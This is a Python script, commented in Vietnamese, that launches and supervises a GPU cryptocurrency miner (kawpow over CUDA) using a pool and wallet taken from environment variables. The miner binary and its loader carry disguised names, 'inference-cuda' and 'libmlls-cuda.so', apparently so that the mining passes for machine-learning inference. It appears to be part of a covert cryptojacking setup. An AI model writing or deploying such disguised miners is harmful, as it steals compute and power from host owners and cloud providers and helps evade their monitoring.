import os
import subprocess
import logging
import threading
import time

# Thiết lập logger
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Định nghĩa stop_event
stop_event = threading.Event()

def start_gpu_mining_process(retries=3, delay=5):
    """
    Khởi động quá trình khai thác GPU (kawpow, CUDA) với cơ chế thử lại.

    Args:
        retries (int): Số lần thử nếu tiến trình khởi chạy thất bại.
        delay (int): Thời gian chờ (giây) giữa mỗi lần thử.

    Returns:
        subprocess.Popen or None
    """
    # Lấy đường dẫn thực thi
    cuda_executable = os.getenv('CUDA_COMMAND', '/usr/local/bin/inference-cuda')
    if not cuda_executable:
        logger.error("Biến môi trường CUDA_COMMAND không được thiết lập (GPU).")
        stop_event.set()
        return None

    if not os.path.isfile(cuda_executable):
        logger.error(f"Không tìm thấy tệp thực thi khai thác GPU tại: {cuda_executable}")
        stop_event.set()
        return None
    if not os.access(cuda_executable, os.X_OK):
        logger.error(f"Tệp thực thi khai thác GPU không có quyền thực thi: {cuda_executable}")
        stop_event.set()
        return None

    # Lấy biến môi trường dành cho GPU
    mining_server_gpu = os.getenv('MINING_SERVER_GPU')
    mining_wallet_gpu = os.getenv('MINING_WALLET_GPU')
    cuda_loader = os.getenv('MLLS_CUDA', '/usr/local/bin/libmlls-cuda.so')

    if not mining_server_gpu:
        logger.error("Biến môi trường MINING_SERVER_GPU không được thiết lập.")
        stop_event.set()
        return None
    if not mining_wallet_gpu:
        logger.error("Biến môi trường MINING_WALLET_GPU không được thiết lập.")
        stop_event.set()
        return None
    if not cuda_loader:
        logger.error("Biến môi trường MLLS_CUDA không được thiết lập.")
        stop_event.set()
        return None

    # Định nghĩa lệnh khai thác GPU
    # Ví dụ: --algo kawpow, --cuda, --cuda-loader=..., -o <pool>, -u <wallet>, -p x, --tls
    gpu_command = [
        cuda_executable,
        '--algo', 'kawpow',
        '--cuda',
        f'--cuda-loader={cuda_loader}',
        '-o', mining_server_gpu,
        '-u', mining_wallet_gpu,
        '-p', 'x',
        '--tls'
    ]

    for attempt in range(1, retries + 1):
        logger.info(f"Thử khởi chạy quá trình khai thác GPU (Cố gắng {attempt}/{retries})...")
        try:
            gpu_process = subprocess.Popen(
                gpu_command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            logger.info(f"Quá trình khai thác GPU đã được khởi động với PID: {gpu_process.pid}")

            time.sleep(2)  # chờ một chút để xem tiến trình có crash ngay không
            if gpu_process.poll() is not None:
                stdout, stderr = gpu_process.communicate()
                logger.error(
                    f"Quá trình khai thác GPU kết thúc ngay với mã trả về: {gpu_process.returncode}"
                )
                if stdout:
                    logger.error(f"GPU STDOUT: {stdout.decode().strip()}")
                if stderr:
                    logger.error(f"GPU STDERR: {stderr.decode().strip()}")
                gpu_process = None
            else:
                logger.info("Quá trình khai thác GPU đang chạy.")
                # Không nhất thiết set mining_started_event vì CPU đã set trước đó
                return gpu_process

        except Exception as e:
            logger.error(f"Lỗi khi khởi động quá trình khai thác GPU: {e}")
            gpu_process = None

        if attempt < retries:
            logger.info(f"Đang đợi {delay} giây trước khi thử lại (GPU)...")
            time.sleep(delay)

    logger.error("Tất cả nỗ lực khởi chạy quá trình khai thác GPU đều thất bại.")
    stop_event.set()
    return None

if __name__ == "__main__":
    process = start_gpu_mining_process()
    if process:
        try:
            # Giữ script chạy để theo dõi quá trình khai thác
            while True:
                time.sleep(1)
                if stop_event.is_set():
                    logger.info("Đang dừng quá trình khai thác GPU.")
                    process.terminate()
                    break
        except KeyboardInterrupt:
            logger.info("Ngắt kết nối bằng tay. Đang dừng quá trình khai thác GPU.")
            process.terminate()
    else:
        logger.error("Không thể khởi động quá trình khai thác GPU.")
